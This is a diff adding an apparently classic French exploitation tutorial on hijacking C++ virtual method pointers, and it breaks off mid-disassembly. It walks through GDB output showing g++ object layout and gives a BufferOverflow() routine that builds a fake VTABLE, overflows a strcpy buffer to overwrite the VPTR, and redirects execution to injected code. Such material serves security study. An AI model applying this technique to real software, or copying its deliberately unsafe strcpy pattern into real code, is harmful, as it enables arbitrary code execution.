@@ -1,0 +1,1407 @@
+--------------------------------------------------------------------------------
+                   		Smashing C++ VPTRs
+--------------------------------------------------------------------------------
+
+Introduction
+============
+A l'heure actuelle, une serie de techniques connues nous montrent comment
+exploiter des buffers overflows dans des programmes codes la plupart du temps
+en C. Malgre que le C soit evidemment encore terriblement utilise, nous
+risquons, dans les annees a venir, de voir apparaitre de plus en plus de
+logiciels ecrits en C++.
+La plupart du temps, toutes les techniques qui etaient applicables en C le sont
+toujours en C++. Mais, le C++ peut nous offrir quelques nouvelles possibilites
+au niveau des buffer overflows, a cause de l'utilisation des technologies
+orientees objets. Nous allons ici analyser une de ces nouvelles possibilites,
+au moyen du compilateur C++ GNU.
+
+
+Quelques rappels de C++
+=======================
+Nous pouvons definir une "classe" comme etant une structure qui contient des
+donnees et une serie de fonctions qui lui sont propres (appelees "methodes").
+Ensuite, on peut creer des variables basees sur cette definition de classe. On
+appelle ces variables des "objets". Par exemple, nous pouvons avoir le programme
+bo1.cpp suivant:
+
+
+#include <stdio.h>
+#include <string.h>
+
+class MyClass { 
+private:
+ char Buffer[32];
+public:
+ void SetBuffer(char *String) {
+  strcpy(Buffer,String);
+ }
+ void PrintBuffer() {
+  printf("%s\n",Buffer);
+ }
+};
+
+void main() {
+ MyClass Object;
+
+ Object.SetBuffer("string");
+ Object.PrintBuffer();
+}
+
+
+Ce petit programme definit une classe MyClass, qui possede 2 methodes.
+Une methode SetBuffer, qui remplit un buffer interne a la classe (Buffer).
+Une methode PrintBuffer, qui affiche le contenu de ce buffer.
+
+Ensuite, on definit un objet Object base sur la classe MyClass.
+Nous remarquons directemment que la methode SetBuffer utilise une fonction
+tres dangereuse pour remplir Buffer, a savoir la fonction strcpy !
+
+Cependant, utiliser la programmation orientee objet de cette maniere n'apporte
+pas d'avantage determinant par rapport a la programmation classique.
+Par contre, un mecanisme tres souvent utilise en programmation orientee objet
+est le mecanisme d'heritage.
+Considerons le programme bo2.cpp suivant, faisant appel au mecanisme d'heritage
+pour creer 2 classes avec des procedures PrintBuffer distinctes:
+
+
+#include <stdio.h>
+#include <string.h>
+
+class BaseClass { 
+private:
+ char Buffer[32];
+public:
+ void SetBuffer(char *String) {
+  strcpy(Buffer,String);
+ }
+ virtual void PrintBuffer() {
+  printf("%s\n",Buffer);
+ }
+};
+
+class MyClass1:public BaseClass {
+public:
+ void PrintBuffer() {
+  printf("MyClass1: ");
+  BaseClass::PrintBuffer();
+ }
+};
+
+class MyClass2:public BaseClass {
+public:
+ void PrintBuffer() {
+  printf("MyClass2: ");
+  BaseClass::PrintBuffer();
+ }
+};
+
+void main() {
+ BaseClass *Object[2];
+
+ Object[0]=new MyClass1;
+ Object[1]=new MyClass2; 
+ Object[0]->SetBuffer("string1");
+ Object[1]->SetBuffer("string2");
+ Object[0]->PrintBuffer();
+ Object[1]->PrintBuffer();
+}
+
+
+Ce programme cree donc 2 classes distinctes (MyClass1,MyClass2) derivees d'une
+classe de base BaseClass. Ces 2 classes sont differentes au niveau de 
+l'affichage (methode PrintBuffer), c'est pourquoi elles implementent toutes
+les 2 une nouvelle version de la methode PrintBuffer, qui fait cependant
+toujours appel a la methode PrintBuffer originale de BaseClass.
+Ensuite, la fonction main() definit un tableau de pointeurs de 2 objets de type
+BaseClass. Chacun de ces objets est cree en instanciant soit la classe MyClass1,
+soit la classe MyClass2, puis on appelle les methodes SetBuffer et PrintBuffer
+de ces 2 objets. Executons maintenant ce programme:
+
+rix@pentium:~/BO > bo2
+MyClass1: string1
+MyClass2: string2
+rix@pentium:~/BO >
+
+Nous remarquons maintenant l'avantage de la programmation objet.
+En effet, les appels de methode PrintBuffer des 2 objets semblent les memes,
+mais nous avons bien 2 methodes differentes qui sont executees, suivant la
+classe de l'objet.
+Tout cela fonctionne parfaitement grace a l'utilisation adequate des "methodes
+virtuelles", qui permettent notamment de redefinir de nouvelles versions des
+methodes de la classe de base, ou de definir une methode de la classe de base
+(si la classe de base est abstraite pure) dans une classe derivee.
+Si nous ne declarons pas la methode comme virtuelle, le compilateur effectuerait
+la resolution de l'appel au moment de la compilation (ligature statique). Pour
+repousser la resolution de l'appel au moment de l'execution (puisque cet appel
+depend de la classe des objets que nous stockons dans notre tableau Object[]),
+nous devons declarer notre methode PrintBuffer "virtual", ce qui permettra une
+ligature dynamique a l'execution.
+
+
+C++ VPTR
+========
+Nous allons maintenant analyser de maniere plus detaillee la maniere dont le
+compilateur traite ce mecanisme de ligature dynamique.
+Reprenons le cas de notre classe BaseClass et des ses classes derivees.
+Le compilateur parcourt la declaration de BaseClass.
+Tout d'abord, il reserve 32 bytes pour la definition de Buffer.
+Ensuite, il lit la declaration de la methode SetBuffer, qui n'est pas virtuelle,
+et il peut donc directemment lui assigner une adresse dans le code.
+Enfin, il lit la declaration de la methode PrintBuffer, qui est virtuelle.
+Dans ce cas, a la place d'effectuer une ligature statique, il effectue une
+ligature dynamique, en reservant dans la classe 4 bytes, qui contiendront un
+pointeur.
+Nous avons donc la structure suivante: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBVVVV
+Ou: B represente un byte de Buffer.
+    V represente un byte de notre pointeur.
+
+Qu'est-ce que ce pointeur ?
+Ce pointeur est appele "VPTR" (Virtual PoinTeR), et pointe une entree dans
+un tableau de pointeurs de fonctions. Les pointeurs de fonctions contenus dans
+ce tableau (appele VTABLE) pointent eux-memes vers les bonnes methodes relatives
+a la classe.
+Il existe une VTABLE par classe, qui contient uniquement des pointeurs vers
+les methodes de la classe.
+Nous avons donc maintenant le schema suivant:
+
+Object[0]: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBVVVV
+					   =+==
+					    |
+	     +------------------------------+
+	     |
+	     +--> VTABLE_MyClass1: IIIIIIIIIIIIPPPP
+
+Object[1]: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBWWWW
+					   =+==
+					    |
+	     +------------------------------+
+	     |
+	     +--> VTABLE_MyClass2: IIIIIIIIIIIIQQQQ
+
+Ou: B represente un byte de Buffer.
+    V represente un byte du VPTR vers VTABLE_MyClass1.
+    W represente un byte du VPTR vers VTABLE_MyClass2.
+    I represente un byte d'informations diverses.
+    P represente un byte du pointeur vers la methode PrintBuffer() de MyClass1.
+    Q represente un byte du pointeur vers la methode PrintBuffer() de MyClass2.
+
+Si nous avions par exemple un 3eme objet de type MyClass1, nous aurions
+
+Object[2]: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBVVVV
+
+avec VVVV qui pointerait vers VTABLE_MyClass1.
+
+Nous remarquons que le VPTR se situe apres notre Buffer en memoire.
+Comme nous remplissons ce buffer via la fonction strcpy(), nous en deduisons
+facilemment que si nous depassons la capacite de notre buffer, nous allons
+pouvoir modifier le contenu de ce VPTR !
+
+ATTENTION !!! Apres certains essais sous Windows, il apparait que Visual C++
+6.0 place le VPTR tout au debut de l'objet, ce qui empeche d'utiliser cette
+technique. Par contre, C++ GNU place lui le pointeur VPTR a la fin, comme
+explique ici.
+
+
+Analyse du fonctionnement du VPTR avec GDB
+==========================================
+Observons maintenant le mecanisme de maniere plus precise, en assembleur.
+Pour cela, nous compilons notre programme et lancons GDB:
+
+rix@pentium:~/BO > gcc -o bo2 bo2.cpp
+rix@pentium:~/BO > gdb bo2
+GNU gdb 4.17.0.11 with Linux support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x80485b0 <main>:       pushl  %ebp
+0x80485b1 <main+1>:     movl   %esp,%ebp
+0x80485b3 <main+3>:     subl   $0x8,%esp
+0x80485b6 <main+6>:     pushl  %edi
+0x80485b7 <main+7>:     pushl  %esi
+0x80485b8 <main+8>:     pushl  %ebx
+0x80485b9 <main+9>:     pushl  $0x24
+0x80485bb <main+11>:    call   0x80487f0 <___builtin_new>
+0x80485c0 <main+16>:    addl   $0x4,%esp
+0x80485c3 <main+19>:    movl   %eax,%eax
+0x80485c5 <main+21>:    pushl  %eax
+0x80485c6 <main+22>:    call   0x8048690 <__8MyClass1>
+0x80485cb <main+27>:    addl   $0x4,%esp
+0x80485ce <main+30>:    movl   %eax,%eax
+0x80485d0 <main+32>:    movl   %eax,0xfffffff8(%ebp)
+0x80485d3 <main+35>:    pushl  $0x24
+0x80485d5 <main+37>:    call   0x80487f0 <___builtin_new>
+0x80485da <main+42>:    addl   $0x4,%esp
+0x80485dd <main+45>:    movl   %eax,%eax
+0x80485df <main+47>:    pushl  %eax
+0x80485e0 <main+48>:    call   0x8048660 <__8MyClass2>
+0x80485e5 <main+53>:    addl   $0x4,%esp
+0x80485e8 <main+56>:    movl   %eax,%eax
+---Type <return> to continue, or q <return> to quit---
+0x80485ea <main+58>:    movl   %eax,0xfffffffc(%ebp)
+0x80485ed <main+61>:    pushl  $0x8048926
+0x80485f2 <main+66>:    movl   0xfffffff8(%ebp),%eax
+0x80485f5 <main+69>:    pushl  %eax
+0x80485f6 <main+70>:    call   0x80486c0 <SetBuffer__9BaseClassPc>
+0x80485fb <main+75>:    addl   $0x8,%esp
+0x80485fe <main+78>:    pushl  $0x804892e
+0x8048603 <main+83>:    movl   0xfffffffc(%ebp),%eax
+0x8048606 <main+86>:    pushl  %eax
+0x8048607 <main+87>:    call   0x80486c0 <SetBuffer__9BaseClassPc>
+0x804860c <main+92>:    addl   $0x8,%esp
+0x804860f <main+95>:    movl   0xfffffff8(%ebp),%eax
+0x8048612 <main+98>:    movl   0x20(%eax),%ebx
+0x8048615 <main+101>:   addl   $0x8,%ebx
+0x8048618 <main+104>:   movswl (%ebx),%eax
+0x804861b <main+107>:   movl   %eax,%edx
+0x804861d <main+109>:   addl   0xfffffff8(%ebp),%edx
+0x8048620 <main+112>:   pushl  %edx
+0x8048621 <main+113>:   movl   0x4(%ebx),%edi
+0x8048624 <main+116>:   call   *%edi
+0x8048626 <main+118>:   addl   $0x4,%esp
+0x8048629 <main+121>:   movl   0xfffffffc(%ebp),%eax
+0x804862c <main+124>:   movl   0x20(%eax),%esi
+0x804862f <main+127>:   addl   $0x8,%esi
+---Type <return> to continue, or q <return> to quit---
+0x8048632 <main+130>:   movswl (%esi),%eax
+0x8048635 <main+133>:   movl   %eax,%edx
+0x8048637 <main+135>:   addl   0xfffffffc(%ebp),%edx
+0x804863a <main+138>:   pushl  %edx
+0x804863b <main+139>:   movl   0x4(%esi),%edi
+0x804863e <main+142>:   call   *%edi
+0x8048640 <main+144>:   addl   $0x4,%esp
+0x8048643 <main+147>:   xorl   %eax,%eax
+0x8048645 <main+149>:   jmp    0x8048650 <main+160>
+0x8048647 <main+151>:   movl   %esi,%esi
+0x8048649 <main+153>:   leal   0x0(%edi,1),%edi
+0x8048650 <main+160>:   leal   0xffffffec(%ebp),%esp
+0x8048653 <main+163>:   popl   %ebx
+0x8048654 <main+164>:   popl   %esi
+0x8048655 <main+165>:   popl   %edi
+0x8048656 <main+166>:   movl   %ebp,%esp
+0x8048658 <main+168>:   popl   %ebp
+0x8048659 <main+169>:   ret
+0x804865a <main+170>:   leal   0x0(%esi),%esi
+End of assembler dump.
+
+Nous allons analyser de maniere detaillee ce que cette fonction main() execute:
+
+0x80485b0 <main>:       pushl  %ebp
+0x80485b1 <main+1>:     movl   %esp,%ebp
+0x80485b3 <main+3>:     subl   $0x8,%esp
+0x80485b6 <main+6>:     pushl  %edi
+0x80485b7 <main+7>:     pushl  %esi
+0x80485b8 <main+8>:     pushl  %ebx
+
+Le programme cree le stack frame, puis il nous reserve 8 bytes sur la pile
+(c'est notre tableau local Object[]), qui contiendra 2 pointeurs de 4 bytes,
+respectivemment en 0xfffffff8(%ebp) pour Object[0] et en 0xfffffffc(%ebp) pour
+Object[1].
+Ensuite, il sauvegarde certains registres divers.
+
+0x80485b9 <main+9>:     pushl  $0x24
+0x80485bb <main+11>:    call   0x80487f0 <___builtin_new>
+0x80485c0 <main+16>:    addl   $0x4,%esp
+
+Le programme appelle maintenant ___builtin_new, qui reserve 0x24 (36 bytes)
+sur le heap pour notre Object[0] et nous renvoie l'adresse de ces bytes
+reserves dans EAX. Les 36 bytes representent respectivemment 32 bytes pour notre
+buffer, suivi des 4 bytes du VPTR.
+
+0x80485c3 <main+19>:    movl   %eax,%eax
+0x80485c5 <main+21>:    pushl  %eax
+0x80485c6 <main+22>:    call   0x8048690 <__8MyClass1>
+0x80485cb <main+27>:    addl   $0x4,%esp
+
+Ici, nous placons l'adresse de l'objet (contenue dans EAX) sur la pile, puis
+nous appellons la fonction __8MyClass1.
+Cette fonction represente en fait le constructeur de la classe MyClass1.
+Il faut aussi remarquer qu'en C++, toute methode travaille avec un parametre
+supplementaire (invisible dans le code C++), qui est en fait l'adresse de
+l'objet dont on execute la methode (c'est le pointeur "This").
+Analysons un peu les instructions executees par ce constructeur:
+
+(gdb) disassemble __8MyClass1
+Dump of assembler code for function __8MyClass1:
+0x8048690 <__8MyClass1>:        pushl  %ebp
+0x8048691 <__8MyClass1+1>:      movl   %esp,%ebp
+0x8048693 <__8MyClass1+3>:      pushl  %ebx
+0x8048694 <__8MyClass1+4>:      movl   0x8(%ebp),%ebx
+
+EBX contient maintenant le pointeur vers les 36 bytes reserves (pointeur This).
+
+0x8048697 <__8MyClass1+7>:      pushl  %ebx
+0x8048698 <__8MyClass1+8>:      call   0x8048700 <__9BaseClass>
+0x804869d <__8MyClass1+13>:     addl   $0x4,%esp
+
+Ici, nous appelons le constructeur de la classe BaseClass.
+En l'analysant rapidemment, nous observons:
+
+(gdb) disass __9BaseClass
+Dump of assembler code for function __9BaseClass:
+0x8048700 <__9BaseClass>:       pushl  %ebp
+0x8048701 <__9BaseClass+1>:     movl   %esp,%ebp
+0x8048703 <__9BaseClass+3>:     movl   0x8(%ebp),%edx
+
+EDX recoit le pointeur vers les 36 bytes reserves (pointeur This).
+
+0x8048706 <__9BaseClass+6>:     movl   $0x8048958,0x20(%edx)
+
+Les 4bytes situes en EDX+0x20 (=EDX+32) recoivent la valeur $0x8048958.
+Ensuite, la fonction __9BaseClass se termine un peu plus loin.
+Si nous lancons:
+
+(gdb) x/aw 0x08048958
+0x8048958 <_vt.9BaseClass>:     0x0
+
+,nous observons que la valeur qui est ecrite en EDX+0x20 (le VPTR de l'objet
+reserve) recoit donc l'adresse de la VTABLE de la classe BaseClass.
+Revenons au code du constructeur de MyClass1.
+Celui ci execute ensuite les instructions suivantes:
+
+0x80486a0 <__8MyClass1+16>:     movl   $0x8048948,0x20(%ebx)
+
+Donc, il ecrit a l'adresse EBX+0x20 (VPTR) la valeur 0x8048948.
+De nouveau, la fonction se termine un peu plus loin.
+Lancons:
+
+(gdb) x/aw 0x08048948
+0x8048948 <_vt.8MyClass1>:      0x0
+
+Nous observons donc que le VPTR est ecrase, et qu'il recoit maintenant l'adresse
+de la VTABLE de la classe MyClass1.
+Nous nous retrouvons donc dans notre fonction main(), avec comme valeur de
+retour (dans EAX), un pointeur vers l'objet alloue en memoire.
+
+0x80485ce <main+30>:    movl   %eax,%eax
+0x80485d0 <main+32>:    movl   %eax,0xfffffff8(%ebp)
+
+Ce pointeur est stocke dans notre tableau, a l'emplacement Object[0].
+Ensuite, le programme procede de meme pour Object[1], a la difference que les
+adresses des VTABLE, VPTR, etc... changent, pour referencier la classe MyClass2
+et non plus la classe MyClass1.
+Apres toutes ces initialisations, les instructions suivantes vont s'executer:
+
+0x80485ed <main+61>:    pushl  $0x8048926
+0x80485f2 <main+66>:    movl   0xfffffff8(%ebp),%eax
+0x80485f5 <main+69>:    pushl  %eax
+
+Ici, nous placons d'abord l'adresse 0x8048926 ainsi que la valeur de Object[0]
+sur la pile (pointeur This).
+Observons l'adresse 0x8048926:
+
+(gdb) x/s 0x08048926
+0x8048926 <_fini+54>:    "string1"
+
+Nous remarquons donc que cette adresse est bien l'adresse de la chaine "string1"
+qui va donc etre copiee par la suite dans Buffer via la procedure SetBuffer de
+la classe BaseClass.
+
+0x80485f6 <main+70>:    call   0x80486c0 <SetBuffer__9BaseClassPc>
+0x80485fb <main+75>:    addl   $0x8,%esp
+
+Nous appelons donc la methode SetBuffer(char*) de la classe BaseClass.
+Il est interessant d'observer que l'appel de la methode SetBuffer se fait de
+maniere directe (puisqu'il ne s'agit pas d'une methode virtuelle).
+Le meme principe est ensuite utilise pour la methode SetBuffer relative a
+l'objet *Object[1].
+
+Pour verifier que nos 2 objets sont correctemment initialises a l'execution,
+nous allons installer les points d'arret suivants:
+0x80485c0: pour obtenir l'adresse de l'objet 1.
+0x80485da: pour obtenir l'adresse de l'objet 2.
+0x804860f: pour verifier que les initialisations des objets se sont bien
+ deroulees.
+
+(gdb) break *0x80485c0
+Breakpoint 1 at 0x80485c0
+(gdb) break *0x80485da
+Breakpoint 2 at 0x80485da
+(gdb) break *0x804860f
+Breakpoint 3 at 0x804860f
+
+Lancons enfin l'execution du programme:
+
+Starting program: /home/rix/BO/bo2
+Breakpoint 1, 0x80485c0 in main ()
+
+En consultant le contenu de EAX, nous aurons l'adresse de notre objet 1:
+
+(gdb) info reg eax
+     eax:  0x8049a70   134519408
+
+Ensuite, nous continuons jusq'au point d'arret suivant:
+
+(gdb) cont
+Continuing.
+Breakpoint 2, 0x80485da in main ()
+
+De meme, nous notons l'adresse de notre objet 2:
+
+(gdb) info reg eax
+     eax:  0x8049a98   134519448
+
+Nous pouvons maintenant lancer l'execution des constructeurs et des methodes
+SetBuffer:
+
+(gdb) cont
+Continuing.
+Breakpoint 3, 0x804860f in main ()
+
+Remarquons que nos 2 objets se suivent en memoire (0x8049a70 et 0x8049a98).
+Cependant, 0x8049a98-0x8049a70=0x28, ce qui veut dire qu'il y a 4 bytes qui ont
+apparement ete inseres entre le 1er et le 2eme objet.
+Si nous visualisons ces bytes:
+
+(gdb) x/aw 0x8049a98-4
+0x8049a94:      0x29
+
+, nous observons qu'ils contiennent la valeur 0x29, c'est a dire la sequence de
+bytes 29 00 00 00.
+De meme, nous pouvons nous rendre compte que l'objet 2 est lui aussi suivi de
+4 bytes particuliers:
+
+(gdb) x/xb 0x8049a98+32+4
+0x8049abc:      0x49
+
+Nous allons maintenant pouvoir afficher de maniere plus precise la structure
+interne de chacun de nos objets maintenant initialises:
+
+(gdb) x/s 0x8049a70
+0x8049a70:       "string1"
+(gdb) x/a 0x8049a70+32
+0x8049a90:      0x8048948 <_vt.8MyClass1>
+(gdb) x/s 0x8049a98
+0x8049a98:       "string2"
+(gdb) x/a 0x8049a98+32
+0x8049ab8:      0x8048938 <_vt.8MyClass2>
+
+De meme, nous pouvons afficher le contenu des VTABLEs de chacune de nos classes:
+
+(gdb) x/a 0x8048948
+0x8048948 <_vt.8MyClass1>:      0x0
+(gdb) x/a 0x8048948+4
+0x804894c <_vt.8MyClass1+4>:    0x0
+(gdb) x/a 0x8048948+8
+0x8048950 <_vt.8MyClass1+8>:    0x0
+(gdb) x/a 0x8048948+12
+0x8048954 <_vt.8MyClass1+12>:   0x8048770 <PrintBuffer__8MyClass1>
+(gdb) x/a 0x8048938
+0x8048938 <_vt.8MyClass2>:      0x0
+(gdb) x/a 0x8048938+4
+0x804893c <_vt.8MyClass2+4>:    0x0
+(gdb) x/a 0x8048938+8
+0x8048940 <_vt.8MyClass2+8>:    0x0
+(gdb) x/a 0x8048938+12
+0x8048944 <_vt.8MyClass2+12>:   0x8048730 <PrintBuffer__8MyClass2>
+
+Nous voyons donc que la methode PrintBuffer() est bien la 4eme methode presente
+dans la VTABLE de nos classes.
+Nous allons maintenant analyser la maniere dont le programme resout de maniere
+dynamique l'appel a la methode PrintBuffer. Pour cela, nous continuerons a
+parcourir en parallele le code de la fonction main(), tout en affichant l'etat
+des registres et memoires utilisees. Nous executerons le code de la fonction
+main() au pas a pas, grace a plusieurs instructions:
+
+(gdb) ni
+
+Nous allons donc executer les instructions suivantes:
+
+0x804860f <main+95>:    movl   0xfffffff8(%ebp),%eax
+
+Cette instruction va faire pointer EAX sur l'objet 1.
+
+0x8048612 <main+98>:    movl   0x20(%eax),%ebx
+0x8048615 <main+101>:   addl   $0x8,%ebx
+
+Ces instructions vont faire pointer EBX sur la 3eme adresse de la VTABLE de
+la classe MyClass1.
+
+0x8048618 <main+104>:   movswl (%ebx),%eax
+0x804861b <main+107>:   movl   %eax,%edx
+
+Ces instructions vont charger le word d'offset +8 dans la VTABLE dans EDX.
+
+0x804861d <main+109>:   addl   0xfffffff8(%ebp),%edx
+0x8048620 <main+112>:   pushl  %edx
+
+Ces instructions ajoutent a EDX l'offset de l'objet 1, et placent l'adresse
+resultante (pointeur This) sur la pile.
+
+0x8048621 <main+113>:   movl   0x4(%ebx),%edi        // EDI = *(VPTR+8+4)
+0x8048624 <main+116>:   call   *%edi                 // execute le code en EDI
+
+Ces instructions place dans EDI la 4eme adresse (VPTR+8+4) de la VTABLE, qui
+est l'adresse de la methode PrintBuffer() de la classe MyClass1. Ensuite,
+cette methode est executee.
+Le meme mecanisme est utilise pour executer la methode PrintBuffer() de la
+classe MyClass2. Enfin, la fonction main() se termine un peu plus loin, par un
+RET.
+
+Nous avons assiste a une manipulation "etrange", pour pointer vers le debut
+de l'objet en memoire, puisque nous sommes alles chercher un offset word en
+VPTR+8 pour l'ajouter a l'adresse de notre objet 1.
+Cette manipulation ne sert a rien dans ce cas precis, parce que la valeur
+pointee par VPTR+8 etait egale a 0:
+
+(gdb) x/a 0x8048948+8
+0x8048950 <_vt.8MyClass1+8>:    0x0
+
+Cependant, cette manipulation est fondee et necessaire dans plusieurs cas
+pratiques, c'est pourquoi il est important de la remarquer. Nous reviendrons
+d'ailleurs sur ce mecanisme plus tard, car il pourra eventuellement nous causer
+des problemes par la suite.
+
+
+Exploiter VPTR
+==============
+Nous allons maintenant essayer d'exploiter de maniere simple le buffer overflow
+qui est present dans le code de notre programe.
+Pour cela, nous devons proceder de la maniere suivante:
+- Construire notre propre VTABLE, dont les adresses pointeront vers le code que
+ nous desirons executer (un shellcode par exemple ;)
+- Ecraser le contenu du VPTR pour qu'il pointe vers notre VTABLE.
+
+Un des moyen de realiser cela, est de coder notre VTABLE au debut du buffer que
+nous allons overflower. Ensuite, nous devons placer la valeur VPTR de maniere a
+ce qu'elle repointe vers le debut du buffer (notre VTABLE), et placer le code
+que nous desirons executer quelque part. Nous pouvons soit le placer juste apres
+notre VTABLE dans notre buffer, soit le placer apres la valeur du VPTR que nous
+allons ecraser.
+Cependant, si nous placons notre shellcode apres le VPTR, il faut etre certain
+que nous ayons accces a cette partie de la memoire, pour ne pas provoquer
+d'erreur de segmentation.
+Cette consideration depend donc en grande partie de la taille du buffer.
+Un buffer de grande taille pourra contenir sans probleme une VTABLE et un
+shellcode, et donc eviter ainsi tout risque d'erreur de segmentation.
+Rappelons nous au passage que nos objets sont chaque fois suivi d'une sequence
+de 4 bytes (0x29, 0x49), et que nous pouvons donc sans problemes aller ecrire
+notre 00h de fin de chaine dans le byte derriere nos VPTRs.
+
+Pour tester, nous allons placer notre code a executer juste avant notre VPTR.
+Nous allons donc adopter la structure suivante dans notre buffer:
+
+ +------(1)---<----------------+
+ |                             |
+ |                           ==+=
+SSSS ..... SSSS ....  B ... CVVVV0
+==+=       =+==             |
+  |         |               |
+  +----(2)--+->-------------+
+
+Ou: V represente les bytes de l'adresse du debut de notre buffer.
+    S represente les bytes de l'adresse de notre code a executer, donc ici
+    l'adresse de C (adresse S=adresse V+offset VPTR dans le buffer-1 dans ce
+    cas-ci, puisque nous avons place notre code a executer juste avant le VPTR).
+    B represente des bytes eventuels d'alignement de valeurs quelconques
+    (NOPs ? :), pour aligner la valeur de notre VPTR sur le VPTR de l'objet.
+    C represente le byte du code a executer, dans ce cas-ci, un simple byte CCh
+    (INT 3), qui va provoquer un signal SIGTRAP.
+    0 represente le byte 00h qui terminera notre buffer (uniquement pour la
+    fonction strcpy()).
+
+Le nombre d'adresses a mettre au debut de notre buffer (SSSS) depend du fait
+que l'on connait ou non l'indice dans la VTABLE de la 1ere methode qui sera
+appelee apres notre overflow:
+Soit on connait cet indice, et on ecrit alors uniquement le pointeur
+correspondant.
+Soit on ne connait pas cet indice, et on genere un nombre maximum de pointeurs
+en esperant que la methode qui sera utilisee proviendra d'un de ces pointeurs,
+tout en sachant qu'une classe qui contient 200 methodes est tres tres rare ;)
+L'adresse a mettre dans VVVV (notre VPTR) depend elle enormement de l'execution
+du programme.
+Il faut ici noter que nos objets ont ete alloues sur le heap, et qu'il est donc
+difficile de pouvoir connaitre exactemment l'adresse de nos objets.
+
+Nous allons donc coder une petite fonction qui nous construira un buffer.
+Cette fonction recevra 3 parametres:
+- BufferAddress: l'adresse du debut du buffer que nous allons overflower.
+- NAddress: le nombre d'adresses que nous voulons dans notre VTABLE.
+
+Voici le code de notre fontion BufferOverflow:
+
+char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) {
+ char *Buffer;
+ unsigned long *LongBuffer;
+ unsigned long CCOffset;
+ int i;
+ 
+ Buffer=(char*)malloc(VPTROffset+4);
+  // alloue le buffer.
+
+ CCOffset=(unsigned long)VPTROffset-1;
+  // calcule l'offset du code a executer dans le buffer.
+  
+ for (i=0;i<VPTROffset;i++) Buffer[i]='\x90';
+  // remplit le buffer de codes 90h (NOP, vieille habitude :)))
+  
+ LongBuffer=(unsigned long*)Buffer;
+  // construit un pointeur pour placer les adresses dans notre VTABLE.
+  
+ for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset;
+  // remplit notre VTABLE au debut du buffer avec l'adresse du code a executer.
+  
+ LongBuffer=(unsigned long*)&Buffer[VPTROffset];
+  // construit un pointeur sur VPTR.
+  
+ *LongBuffer=BufferAddress;
+  // valeur qui ecrasera VPTR.
+  
+ Buffer[CCOffset]='\xCC';
+  // notre code executable.
+
+ Buffer[VPTROffset+4]='\x00';  
+ // termine par un caractere de fin de chaine.
+ 
+ return Buffer; 
+}
+
+Dans notre programme, nous pouvons appeler notre fonction BufferOverflow(), avec
+comme parametres:
+- l'adresse de notre buffer, qui est ici l'adresse de notre objet (Object[0]).
+- 4 valeurs dans notre VTABLE dans ce cas-ci (puisque PrintBuffer est en
+   VTABLE+8+4).
+- 32 comme offset pour VPTR.
+Voici le code resultant (bo3.cpp):
+
+
+#include <stdio.h>
+#include <string.h>
+#include <malloc.h>
+
+class BaseClass { 
+private:
+ char Buffer[32];
+public:
+ void SetBuffer(char *String) {
+  strcpy(Buffer,String);
+ }
+ virtual void PrintBuffer() {
+  printf("%s\n",Buffer);
+ }
+};
+
+class MyClass1:public BaseClass {
+public:
+ void PrintBuffer() {
+  printf("MyClass1: ");
+  BaseClass::PrintBuffer();
+ }
+};
+
+class MyClass2:public BaseClass {
+public:
+ void PrintBuffer() {
+  printf("MyClass2: ");
+  BaseClass::PrintBuffer();
+ }
+};
+
+char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) {
+ char *Buffer;
+ unsigned long *LongBuffer;
+ unsigned long CCOffset;
+ int i;
+ 
+ Buffer=(char*)malloc(VPTROffset+4+1);
+
+ CCOffset=(unsigned long)VPTROffset-1; 
+ for (i=0;i<VPTROffset;i++) Buffer[i]='\x90';
+ LongBuffer=(unsigned long*)Buffer;
+ for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset;
+ LongBuffer=(unsigned long*)&Buffer[VPTROffset];
+ *LongBuffer=BufferAddress;
+ Buffer[CCOffset]='\xCC';
+ Buffer[VPTROffset+4]='\x00';
+ return Buffer; 
+}
+
+void main() {
+ BaseClass *Object[2];
+
+ Object[0]=new MyClass1;
+ Object[1]=new MyClass2; 
+ Object[0]->SetBuffer(BufferOverflow((unsigned long)&(*Object[0]),4,32));  
+ Object[1]->SetBuffer("string2");
+ Object[0]->PrintBuffer();
+ Object[1]->PrintBuffer();
+}
+
+
+Nous compilons, et nous lancons GDB:
+rix@pentium:~/BO > gcc -o bo3 bo3.cpp
+rix@pentium:~/BO > gdb bo3
+...
+(gdb) disass main
+Dump of assembler code for function main:
+0x8048670 <main>:       pushl  %ebp
+0x8048671 <main+1>:     movl   %esp,%ebp
+0x8048673 <main+3>:     subl   $0x8,%esp
+0x8048676 <main+6>:     pushl  %edi
+0x8048677 <main+7>:     pushl  %esi
+0x8048678 <main+8>:     pushl  %ebx
+0x8048679 <main+9>:     pushl  $0x24
+0x804867b <main+11>:    call   0x80488c0 <___builtin_new>
+0x8048680 <main+16>:    addl   $0x4,%esp
+0x8048683 <main+19>:    movl   %eax,%eax
+0x8048685 <main+21>:    pushl  %eax
+0x8048686 <main+22>:    call   0x8048760 <__8MyClass1>
+0x804868b <main+27>:    addl   $0x4,%esp
+0x804868e <main+30>:    movl   %eax,%eax
+0x8048690 <main+32>:    movl   %eax,0xfffffff8(%ebp)
+0x8048693 <main+35>:    pushl  $0x24
+0x8048695 <main+37>:    call   0x80488c0 <___builtin_new>
+0x804869a <main+42>:    addl   $0x4,%esp
+0x804869d <main+45>:    movl   %eax,%eax
+0x804869f <main+47>:    pushl  %eax
+0x80486a0 <main+48>:    call   0x8048730 <__8MyClass2>
+0x80486a5 <main+53>:    addl   $0x4,%esp
+0x80486a8 <main+56>:    movl   %eax,%eax
+---Type <return> to continue, or q <return> to quit---
+0x80486aa <main+58>:    movl   %eax,0xfffffffc(%ebp)
+0x80486ad <main+61>:    pushl  $0x20
+0x80486af <main+63>:    pushl  $0x4
+0x80486b1 <main+65>:    movl   0xfffffff8(%ebp),%eax
+0x80486b4 <main+68>:    pushl  %eax
+0x80486b5 <main+69>:    call   0x80485b0 <BufferOverflow__FUlii>
